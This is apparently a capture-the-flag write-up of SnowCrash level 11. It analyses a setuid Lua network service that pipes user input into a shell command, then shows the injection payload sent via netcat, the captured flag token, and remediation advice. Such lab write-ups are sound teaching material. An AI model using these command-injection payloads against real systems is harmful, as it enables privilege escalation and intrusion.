# Level 11 — OS Command Injection via Lua Network Service

## Reconnaissance

Listing the home directory reveals a Lua script owned by `flag11` with the
setuid bit set, meaning it runs with elevated privileges.
```bash
level11@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout
-r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
-r-x------  1 level11 level11  675 Apr  3  2012 .profile
```

Reading the script:
```bash
level11@SnowCrash:~$ cat level11.lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()
  data = string.sub(data, 1, 40)
  return data
end
while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)
      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end
  end
  client:close()
end
```

## Source Analysis

The script runs a TCP server on port 5151. When a client connects, it reads
a password, hashes it with SHA1, and compares it to a hardcoded value.

The vulnerability is in the `hash` function:
```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

The `..` operator in Lua is string concatenation. The user-supplied `pass`
is concatenated directly into a shell command string and executed via
`io.popen`, without any sanitisation. This is a textbook OS Command Injection
vulnerability.

## Exploitation

Connecting with netcat and sending a crafted payload breaks out of the
intended `echo` command using a semicolon, then executes `getflag` with the
elevated privileges of `flag11`.
```bash
level11@SnowCrash:~$ nc localhost 5151
Password: ; getflag > /tmp/flag11 2>&1
Erf nope..
level11@SnowCrash:~$ cat /tmp/flag11
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

The shell interprets the injected input as:
```bash
echo ; getflag > /tmp/flag11 2>&1 | sha1sum
```

| Fragment | Effect |
|---|---|
| `echo` | Executes harmlessly, prints nothing |
| `;` | Terminates the current command, starts a new one |
| `getflag` | Executes with setuid privileges of `flag11` |
| `> /tmp/flag11` | Redirects stdout to a temporary file |
| `2>&1` | Redirects stderr to the same file (required as `getflag` writes to stderr) |

## Vulnerability Class

OS Command Injection (CWE-78) — OWASP Top 10: A03 Injection

## Remediation

- Never concatenate user input directly into shell command strings.
- Use parameterised command execution where the input is passed as an
  argument, not interpolated into a string evaluated by a shell.
- Validate and whitelist input before any processing (e.g. accept only
  alphanumeric characters for a password field).
- Apply the principle of least privilege: avoid running network-facing
  services with setuid permissions.

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [CWE-78: Improper Neutralization of Special Elements](https://cwe.mitre.org/data/definitions/78.html)
